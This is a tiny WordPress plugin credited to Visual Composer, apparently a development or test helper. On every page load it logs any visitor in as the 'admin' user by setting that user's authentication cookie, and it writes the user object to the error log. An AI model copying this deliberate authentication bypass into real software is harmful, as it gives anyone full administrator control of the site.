<?php
/*
Plugin Name: VC Auto Autorize
Plugin URI: http://visualcomposer.com
Description: VC Auto Autorize
Version: 1.0
Author: VV - Visual Composer
Author URI: http://visualcomposer.com
*/
add_action('plugins_loaded', function () {
    $user_login = 'admin';

    $user = get_user_by( 'slug', $user_login );
    $user_id = $user->ID;
    
    $curr = wp_set_current_user($user_id, $user_login);
    error_log(print_r($curr,true));
    wp_set_auth_cookie($user_id);
    do_action('wp_login', $user_login, $user, false);
});
